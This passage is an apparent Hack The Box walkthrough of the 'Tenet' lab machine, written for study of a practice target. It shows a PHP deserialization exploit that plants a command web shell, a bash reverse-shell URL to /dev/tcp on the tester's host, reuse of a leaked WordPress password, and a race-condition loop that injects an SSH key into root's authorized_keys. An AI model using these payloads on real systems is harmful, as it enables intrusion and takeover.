    15          public <span class="k">function </span>__destruct<span class="o">()</span>
    16          <span class="o">{</span>
    17                  file_put_contents<span class="o">(</span>__DIR__ <span class="nb">.</span> <span class="s1">'/'</span> <span class="nb">.</span> <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
    18                  <span class="nb">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
    19          //      <span class="nb">echo</span> <span class="s1">'Gotta get this working properly...'</span><span class="p">;</span>
    20          <span class="o">}</span>
    21  <span class="o">}</span>
    22
    23  <span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'arepo'</span><span class="o">]</span> ?? <span class="s1">''</span><span class="p">;</span>
    24  <span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>
    25
    26  <span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
    27  <span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>
    28
    29
    30  ?&gt;
</code></pre></div></div> <p>Looking at the code was possible to detect a <strong>PHP deserialization</strong> vulnerability caused by the <code class="language-plaintext highlighter-rouge">__destruct()</code> magic method, which is <strong>called every time there are no other references to a particular object during the shutdown sequence</strong> (more info <a href="https://www.php.net/manual/en/language.oop5.magic.php">here</a>).</p> <p>By design the function updates the <code class="language-plaintext highlighter-rouge">users.txt</code> file on the server using the <code class="language-plaintext highlighter-rouge">$app</code> object, however because the <code class="language-plaintext highlighter-rouge">unserialize()</code> methods allowed to instantiate a new custom object <code class="language-plaintext highlighter-rouge">$databaseupdate</code>, it was possible to exploit the PHP deserialization and abuse the <code class="language-plaintext highlighter-rouge">__destruct()</code> to <strong>write arbitrary file</strong> on disk, leading to remote code execution.</p> <p>The script used to craft the PoC was the following one:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'test.txt'</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'10099 the test'</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DataBaseExport</span><span class="p">;</span>
<span class="nv">$serialized</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$app</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$serialized</span><span class="p">;</span>

<span class="cp">?&gt;</span>
</code></pre></div></div> <p>It was used to serialize a custom object:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/exploit]
└─<span class="nv">$ </span>php serializer.php
O:14:<span class="s2">"DatabaseExport"</span>:2:<span class="o">{</span>s:9:<span class="s2">"user_file"</span><span class="p">;</span>s:8:<span class="s2">"test.txt"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:14:<span class="s2">"10099 the test"</span><span class="p">;</span><span class="o">}</span>
</code></pre></div></div> <p>The serialized object was passed to the vulnerable function: <img src="/assets/images/Screenshots/Tenet/Pasted image 20210508001613.png" alt="Pasted image 20210508001613.png" /></p> <p><code class="language-plaintext highlighter-rouge">test.txt</code> was created, meaning that the <strong>PoC worked</strong> and the target is vulnerable: <img src="/assets/images/Screenshots/Tenet/Pasted image 20210508001702.png" alt="Pasted image 20210508001702.png" /></p> <p>To get remote code execution the script was modified to write a simple web shell on the target:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/exploit]
└─<span class="nv">$ </span><span class="nb">cat</span> <span class="nt">-n</span> serializer.php
     1  &lt;?php
     2
     3  class DatabaseExport
     4  <span class="o">{</span>
     5          public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'maoutis.php'</span><span class="p">;</span>
     6          public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php if(isset($_REQUEST["cmd"])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'</span><span class="p">;</span>
     7  <span class="o">}</span>
     8
     9  <span class="nv">$app</span> <span class="o">=</span> new DataBaseExport<span class="p">;</span>
    10  <span class="nv">$serialized</span> <span class="o">=</span> serialize<span class="o">(</span><span class="nv">$app</span><span class="o">)</span><span class="p">;</span>
    11  <span class="nb">echo</span> <span class="nv">$serialized</span><span class="p">;</span>
    12
    13  ?&gt;

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/exploit]
└─<span class="nv">$ </span>php serializer.php
O:14:<span class="s2">"DatabaseExport"</span>:2:<span class="o">{</span>s:9:<span class="s2">"user_file"</span><span class="p">;</span>s:11:<span class="s2">"maoutis.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:113:<span class="s2">"&lt;?php if(isset(</span><span class="nv">$_REQUEST</span><span class="s2">["</span>cmd<span class="s2">"])){ echo "</span>&lt;pre&gt;<span class="s2">"; </span><span class="nv">$cmd</span><span class="s2"> = (</span><span class="nv">$_REQUEST</span><span class="s2">["</span>cmd<span class="s2">"]); system(</span><span class="nv">$cmd</span><span class="s2">); echo "</span>&lt;/pre&gt;<span class="s2">"; die; }?&gt;"</span><span class="p">;</span><span class="o">}</span>
</code></pre></div></div> <p>Then the exploit object was passed to the vulnerable function and the web shell was generated: <img src="/assets/images/Screenshots/Tenet/Pasted image 20210508002157.png" alt="Pasted image 20210508002157.png" /> <img src="/assets/images/Screenshots/Tenet/Pasted image 20210508002210.png" alt="Pasted image 20210508002210.png" /></p> <p>Finally the reverse shell command was sent to the web shell and a reverse connection was obtained: <code class="language-plaintext highlighter-rouge">http://10.10.10.223/maoutis.php?cmd=/bin/bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.24/10099+0&gt;%261</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/exploit]
└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 10099
listening on <span class="o">[</span>any] 10099 ...
connect to <span class="o">[</span>10.10.14.24] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223] 30304
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1642<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@tenet:/var/www/html<span class="err">$</span>
www-data@tenet:/var/www/html<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
www-data@tenet:/var/www/html<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 10099

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/exploit]
└─<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>

<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 10099

www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">stty </span>rows 60 columns 235
</code></pre></div></div> <h2 id="lateral-movement"> <a href="#lateral-movement" class="anchor-heading" aria-labelledby="lateral-movement"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Lateral Movement </h2> <p>Enumerated local users:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@tenet:/var<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-v</span> nologin
root:x:0:0:root:/root:/bin/bash
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
lxd:x:105:65534::/var/lib/lxd/:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
neil:x:1001:1001:neil,,,:/home/neil:/bin/bash
</code></pre></div></div> <p>Wordpress configuration file <strong>leaked mysql credentials</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">cat</span> <span class="nt">-s</span> wp-config.php
...
// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_USER'</span>, <span class="s1">'neil'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_PASSWORD'</span>, <span class="s1">'Opera&lt;redacted&gt;'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span> <span class="o">)</span><span class="p">;</span>
</code></pre></div></div> <p>Because <code class="language-plaintext highlighter-rouge">neil</code> reused the same password, it was possible to get user access to the target machine using leaked credentials:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/exploit]
└─<span class="nv">$ </span>ssh neil@tenet.htb
neil@tenet.htb<span class="s1">'s password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May  7 22:39:29 UTC 2021

  System load:  0.0                Processes:             185
  Usage of /:   15.4% of 22.51GB   Users logged in:       0
  Memory usage: 12%                IP address for ens160: 10.10.10.223
  Swap usage:   0%


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May  7 19:57:44 2021 from 10.10.14.13
neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
</span></code></pre></div></div> <h2 id="privilege-escalation"> <a href="#privilege-escalation" class="anchor-heading" aria-labelledby="privilege-escalation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Privilege Escalation </h2> <p>Enumerated <code class="language-plaintext highlighter-rouge">neil</code> sudo privileges:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~/.local/share/nano<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>neil on tenet:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>

User neil may run the following commands on tenet:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
</code></pre></div></div> <p>Enumerated enableSSH.sh:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~/.local/share/nano<span class="nv">$ </span><span class="nb">cat</span> <span class="nt">-sn</span> /usr/local/bin/enableSSH.sh
     1  <span class="c">#!/bin/bash</span>
     2
     3  checkAdded<span class="o">()</span> <span class="o">{</span>
     4
     5          <span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>
     6
     7          <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
     </span>8
     9                  /bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
    10
    11          <span class="k">else
    </span>12
    13                  /bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
    14
    15          <span class="k">fi
    </span>16
    17  <span class="o">}</span>
    18
    19  checkFile<span class="o">()</span> <span class="o">{</span>
    20
    21          <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span>22
    23                  /bin/echo <span class="s2">"Error in creating key file!"</span>
    24
    25                  <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi
    </span>26
    27                  <span class="nb">exit </span>1
    28
    29          <span class="k">fi
    </span>30
    31  <span class="o">}</span>
    32
    33  addKey<span class="o">()</span> <span class="o">{</span>
    34
    35          <span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>
    36
    37          <span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>
    38
    39          /bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>
    40
    41          checkFile <span class="nv">$tmpName</span>
    42
    43          /bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys
    44
    45          /bin/rm <span class="nv">$tmpName</span>
    46
    47  <span class="o">}</span>
    48
    49  <span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
    50  addKey
    51  checkAdded
</code></pre></div></div> <p>Looking at the source code it was possible to detect a <strong>race condition</strong> vulnerability in the <code class="language-plaintext highlighter-rouge">addKey()</code> function caused by the <strong>insecure temporary save of the future content of root’s authorized_key</strong>. This issue allowed to poison the temp file and inject inside the root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> a custom value, allowing to get a high privileged access to the machine.</p> <p>PoC of the insecure temp files (word writable file):</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:/tmp<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">ls</span> <span class="nt">-al</span> /tmp/ssh<span class="k">*</span> 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span> &amp;
<span class="o">[</span>1] 17432
neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
<span class="nt">-rw-rw-rw-</span> 1 root root 393 May  8 11:52 /tmp/ssh-ZivT3CmF
</code></pre></div></div> <p>Created a loop that poisons the temp file with a custom ssh public key:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:/tmp<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> /tmp/ssh<span class="k">*</span> 2&gt;/dev/null<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAtXPtZN+kJ7TjgTIBnQdDQz9S/i417/k+SFrAl8vsUaBpgZrMQ3C6hFUnlLCYx4XTlE3ux/ucakxudjc/0PTjnYJBvUVWqzrrkHyOQ9a4jql3f3VdQjQojYu9QuF7gw2upR10f8vfBK5150AcvlG9Guo/bpiILQBHmVyBz3/0q/CJaiklBoWtfqGUvpCRYMi0A6SlW3ivmPMHqpJOmjw45U+NRCJMt9FwR/MvbpCxafLT2NjNId7sAySYY+zSJsmtKGz5jpLYrgOUUqrT03eRVivn5FcOlRY0SeRZe9q04DPw39PsjnHuzRioz49FnLb/J6HCpEx0BGM3vVhDoMTtWPmRVbKJbZw84RigagcAYnjL9uEhuzjAIqFpH+0HBetQ1ZXGlGQNwAR8FC+bZcnulQWUC5ceYtszHsrjNSwaDBL675thz5TtygxVVov12PyPQCONX5Xep3Ylxj53lNYlVKUbfiMGI3kXxmcsocXubHI7Au+q9FKq8XIoZadangM='</span> <span class="o">&gt;</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> &amp;
<span class="o">[</span>1] 28754
</code></pre></div></div> <p>Ran the script a couple of times in order to be sure to overwrite the key:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp<span class="err">$</span>
neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp<span class="nv">$ </span><span class="nb">ls
</span>pspy64
ssh-gEr8Rial
ssh-NIjuZPmj
systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-apache2.service-jp1S5z
systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-systemd-resolved.service-FUiyZO
systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-systemd-timesyncd.service-xDGTr1
tmux-1001
vmware-root_982-2965972296
</code></pre></div></div> <p>Logged in using the custom ssh key:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span><span class="nb">sudo </span>ssh root@tenet.htb <span class="nt">-i</span> /home/pwn/.ssh/id_rsa
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sat May  8 12:14:32 UTC 2021

  System load:  1.11               Processes:             189
  Usage of /:   15.5% of 22.51GB   Users logged <span class="k">in</span>:       1
  Memory usage: 19%                IP address <span class="k">for </span>ens160: 10.10.10.223
  Swap usage:   0%


 <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list <span class="nt">--upgradable</span>

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Feb 11 14:37:46 2021
root@tenet:~# <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">cat</span> /root/root.txt <span class="o">&amp;&amp;</span> ifconfig
root
tenet
04fd5a870b622aa491f031f6fe80f662
ens160: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.10.223  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:c415  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        inet6 dead:beef::250:56ff:feb9:c415  prefixlen 64  scopeid 0x0&lt;global&gt;
        ether 00:50:56:b9:c4:15  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 772376  bytes 120290915 <span class="o">(</span>120.2 MB<span class="o">)</span>
        RX errors 0  dropped 366  overruns 0  frame 0
        TX packets 796895  bytes 315607462 <span class="o">(</span>315.6 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 192113  bytes 13793013 <span class="o">(</span>13.7 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 192113  bytes 13793013 <span class="o">(</span>13.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div> <p><img src="/assets/images/Screenshots/Tenet/Pasted image 20210508141146.png" alt="Pasted image 20210508141146.png" /></p> <h2 id="trophy"> <a href="#trophy" class="anchor-heading" aria-labelledby="trophy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Trophy </h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In a parallel worlds theory, we can't know the relationship between consciousness
and multiple realities. Does your head hurt yet ? Try to get some sleep.
- Neil
</code></pre></div></div> <h2 id="video"> <a href="#video" class="anchor-heading" aria-labelledby="video"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Video </h2> <iframe width="560" height="315" src="https://www.youtube.com/embed/_TzptHZLVgs" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe> <style> .share { display: block; margin-left: auto; margin-right: auto; text-align: center; } </style> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs> <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol> <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol> <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol> <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol> <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol> <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol> <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol> <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 